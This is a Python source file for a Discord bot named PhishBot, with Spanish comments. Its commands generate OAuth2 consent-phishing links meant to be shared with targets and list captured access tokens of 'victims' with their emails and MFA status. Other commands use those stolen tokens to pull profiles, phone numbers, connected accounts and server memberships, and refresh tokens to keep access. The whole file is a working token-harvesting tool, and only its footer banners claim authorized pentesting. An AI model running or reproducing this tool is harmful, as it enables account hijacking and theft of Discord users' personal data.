# bot.py
# Bot de Discord con comandos para pentesters
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import discord
import logging
import datetime
import requests
import urllib.parse
import json
import secrets
import base64
from discord.ext import commands
from config import config
from token_manager import token_manager

logger = logging.getLogger("DiscordBot")

class PhishBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guilds = True
        super().__init__(
            command_prefix=config.BOT_COMMAND_PREFIX,
            intents=intents,
            help_command=None
        )
        self.add_commands()

    def generate_oauth_url(self, guild_id):
        state_payload = {
            "guild_id": str(guild_id),
            "nonce": secrets.token_hex(16),
            "ts": datetime.datetime.now().timestamp()
        }
        state_b64 = base64.urlsafe_b64encode(json.dumps(state_payload).encode()).decode()
        scopes = config.OAUTH_SCOPES.replace(" ", "%20")
        return (
            f"https://discord.com/api/oauth2/authorize"
            f"?client_id={config.CLIENT_ID}"
            f"&permissions={config.OAUTH_PERMISSIONS}"
            f"&scope={scopes}"
            f"&redirect_uri={urllib.parse.quote(config.CALLBACK_URL)}"
            f"&response_type=code"
            f"&state={state_b64}"
            f"&guild_id={guild_id}"
            f"&disable_guild_select=true"
        )

    def add_commands(self):
        @self.command(name="phishlink", aliases=["genlink", "oauth"])
        @commands.has_permissions(administrator=True)
        async def phishlink(ctx):
            guild_id = ctx.guild.id
            oauth_url = self.generate_oauth_url(guild_id)
            embed = discord.Embed(
                title="🔗 Enlace OAuth2 Generado",
                description=f"Comparte este enlace con los objetivos.\n\n```\n{oauth_url}\n```",
                color=0x5865F2,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(
                name="📊 Target Info",
                value=f"Servidor: **{ctx.guild.name}**\nID: `{guild_id}`\nMiembros: **{ctx.guild.member_count}**",
                inline=False
            )
            embed.set_footer(text="⚠️ USO EXCLUSIVO: Pentest Autorizado")
            try:
                await ctx.author.send(embed=embed)
                await ctx.send("✅ Te envié el enlace por mensaje directo.")
                msg = await ctx.send("📬 Revisa tus mensajes directos.")
                await msg.delete(delay=10)
            except discord.Forbidden:
                await ctx.send("❌ No puedo enviarte MD. Abre tus mensajes directos.")
            logger.info(f"Link generado para guild {ctx.guild.name} ({guild_id}) por {ctx.author}")

        @self.command(name="tokens", aliases=["list", "victims"])
        @commands.has_permissions(administrator=True)
        async def list_tokens(ctx):
            guild_id = str(ctx.guild.id)
            tokens = token_manager.get_all_tokens(guild_id)
            if not tokens:
                embed = discord.Embed(
                    title="📭 Sin tokens capturados",
                    description="Usa `!phishlink` para generar un enlace.",
                    color=0xFFA500
                )
                await ctx.send(embed=embed)
                return
            embed = discord.Embed(
                title=f"🔑 Tokens capturados: {len(tokens)}",
                description=f"Servidor: **{ctx.guild.name}**",
                color=0x00FF00,
                timestamp=datetime.datetime.now()
            )
            now = datetime.datetime.now()
            for t in tokens[-15:]:
                username = t.get("username", "Desconocido")
                email = t.get("email", "Sin email")
                mfa = "✅ MFA" if t.get("mfa_enabled") else "❌ No MFA"
                nitro = {0: "", 1: "⭐", 2: "🌟"}.get(t.get("premium_type", 0), "")
                expires_at = t.get("expires_at")
                status = ""
                if expires_at:
                    try:
                        exp = datetime.datetime.fromisoformat(expires_at)
                        remaining = exp - now
                        if remaining.total_seconds() > 0:
                            status = f"⏳ {int(remaining.total_seconds()/3600)}h restantes"
                        else:
                            status = "❌ Expirado"
                    except:
                        status = "⏳ ?"
                embed.add_field(
                    name=f"👤 {username}",
                    value=f"📧 `{email}`\n🆔 `{t.get('user_id','N/A')}`\n🔒 {mfa} {nitro}\n{status}",
                    inline=False
                )
            stats = token_manager.get_stats()
            embed.set_footer(text=f"Total: {stats['total']} | Válidos: {stats['valid']} | MFA: {stats['with_mfa']}")
            await ctx.send(embed=embed)

        @self.command(name="user", aliases=["info", "whois"])
        @commands.has_permissions(administrator=True)
        async def user_info(ctx, user_id: str):
            token_data = token_manager.get_token(user_id)
            if not token_data:
                await ctx.send(f"❌ No hay token capturado para `{user_id}`")
                return
            access_token = token_data.get("access_token")
            headers = {"Authorization": f"Bearer {access_token}"}
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            if r.status_code != 200:
                await ctx.send(f"❌ Token expirado para `{user_id}`. Usa `!refresh {user_id}`")
                return
            profile = r.json()
            embed = discord.Embed(
                title=f"👤 {profile['username']}#{profile.get('discriminator','0')}",
                description=f"ID: `{profile['id']}`",
                color=0x5865F2,
                timestamp=datetime.datetime.now()
            )
            embed.add_field(name="Email", value=f"`{profile.get('email','N/A')}`", inline=True)
            embed.add_field(name="Teléfono", value=f"`{profile.get('phone','N/A')}`", inline=True)
            embed.add_field(name="MFA", value="✅ Activado" if profile.get("mfa_enabled") else "❌ Desactivado", inline=True)
            embed.add_field(name="Verificado", value="✅ Sí" if profile.get("verified") else "❌ No", inline=True)
            embed.add_field(name="Nitro", value={0:"Ninguno",1:"Classic",2:"Nitro"}.get(profile.get("premium_type",0),"N/A"), inline=True)
            embed.add_field(name="Locale", value=f"`{profile.get('locale','N/A')}`", inline=True)
            embed.add_field(name="Capturado", value=f"`{token_data.get('captured_at','N/A')[:19]}`", inline=True)
            embed.add_field(name="Expira", value=f"`{token_data.get('expires_at','N/A')[:19]}`", inline=True)
            r2 = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers, timeout=10)
            if r2.status_code == 200:
                connections = r2.json()
                if connections:
                    embed.add_field(name="Conexiones", value="\n".join(f"{c['type'].capitalize()}: {c['name']}" for c in connections[:5]), inline=False)
            r3 = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
            if r3.status_code == 200:
                guilds = r3.json()
                embed.add_field(name="Servidores", value=f"**{len(guilds)}** servidores", inline=False)
                for g in guilds[:10]:
                    owner = " 👑" if g.get("owner") else ""
                    embed.add_field(name=g["name"], value=f"`{g['id']}`{owner}", inline=True)
            await ctx.send(embed=embed)

        @self.command(name="refresh", aliases=["renew"])
        @commands.has_permissions(administrator=True)
        async def refresh_token_cmd(ctx, user_id: str):
            token_data = token_manager.get_token(user_id)
            if not token_data:
                await ctx.send(f"❌ No hay token para `{user_id}`")
                return
            msg = await ctx.send(f"🔄 Refrescando token de `{token_data.get('username')}`...")
            refreshed = token_manager.refresh_token(token_data)
            if refreshed:
                token_manager.add_token(refreshed)
                await msg.edit(content=f"✅ Token refrescado. Nueva expiración: `{refreshed.get('expires_at','?')[:19]}`")
            else:
                await msg.edit(content="❌ No se pudo refrescar. El token puede estar revocado.")

        @self.command(name="cleanup", aliases=["purge"])
        @commands.has_permissions(administrator=True)
        async def cleanup_cmd(ctx):
            msg = await ctx.send("🧹 Limpiando tokens expirados...")
            removed = token_manager.cleanup_expired()
            stats = token_manager.get_stats()
            await msg.edit(content=f"🧹 Limpieza completada.\nTokens eliminados: **{removed}**\nTokens vigentes: **{stats['valid']}**")

        @self.command(name="stats", aliases=["status"])
        @commands.has_permissions(administrator=True)
        async def stats_cmd(ctx):
            stats = token_manager.get_stats()
            embed = discord.Embed(title="📊 Estadísticas de Tokens", color=0x5865F2, timestamp=datetime.datetime.now())
            embed.add_field(name="Total capturados", value=str(stats["total"]), inline=True)
            embed.add_field(name="Válidos", value=str(stats["valid"]), inline=True)
            embed.add_field(name="Expirados", value=str(stats["expired"]), inline=True)
            embed.add_field(name="Con MFA", value=str(stats["with_mfa"]), inline=True)
            embed.add_field(name="Sin MFA", value=str(stats["without_mfa"]), inline=True)
            embed.add_field(name="Con Nitro", value=str(stats["with_nitro"]), inline=True)
            embed.add_field(name="Con Email", value=str(stats["with_email"]), inline=True)
            embed.add_field(name="Servidores únicos", value=str(stats["unique_guilds"]), inline=True)
            if stats["total"] > 0:
                mfa_pct = (stats["with_mfa"] / stats["total"]) * 100
                embed.add_field(name="Tasa de MFA", value=f"{mfa_pct:.1f}%", inline=True)
            await ctx.send(embed=embed)

        @self.command(name="help", aliases=["h", "comandos"])
        async def help_cmd(ctx):
            embed = discord.Embed(
                title="📖 Comandos del Bot - Phishing OAuth2",
                description="Requiere permisos de **Administrador**.",
                color=0x5865F2
            )
            for cmd, desc in [
                ("!phishlink", "Genera enlace OAuth2 para capturar tokens"),
                ("!tokens", "Lista todos los tokens capturados"),
                ("!user <ID>", "Info detallada de un usuario"),
                ("!refresh <ID>", "Refresca un token antes de que expire"),
                ("!cleanup", "Elimina tokens expirados"),
                ("!stats", "Estadísticas globales"),
                ("!help", "Muestra esta ayuda")
            ]:
                embed.add_field(name=cmd, value=desc, inline=False)
            embed.set_footer(text="⚠️ USO EXCLUSIVO EN PENTESTING AUTORIZADO")
            await ctx.send(embed=embed)

    async def on_ready(self):
        logger.info(f"Bot conectado como {self.user} (ID: {self.user.id})")
        activity = discord.Game(name=config.BOT_ACTIVITY)
        await self.change_presence(activity=activity)
        print(f"\n{'='*60}")
        print(f"  BOT DE DISCORD CONECTADO")
        print(f"  Usuario: {self.user}")
        print(f"  ID: {self.user.id}")
        print(f"  Servidores: {len(self.guilds)}")
        print(f"{'='*60}\n")

    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.send("❌ Necesitas permisos de **Administrador**.")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send(f"❌ Falta un argumento. Usa `!help`.")
        elif not isinstance(error, commands.CommandNotFound):
            logger.error(f"Error en comando {ctx.command}: {error}")
            await ctx.send(f"❌ Error: {str(error)[:100]}")

def run_bot():
    bot = PhishBot()
    if not config.BOT_TOKEN or config.BOT_TOKEN == "TU_BOT_TOKEN_AQUI":
        logger.error("❌ BOT_TOKEN no configurado.")
        return
    try:
        bot.run(config.BOT_TOKEN, log_handler=None)
    except discord.LoginFailure:
        logger.error("❌ Token del bot inválido.")
    except Exception as e:
        logger.error(f"❌ Error iniciando bot: {e}")
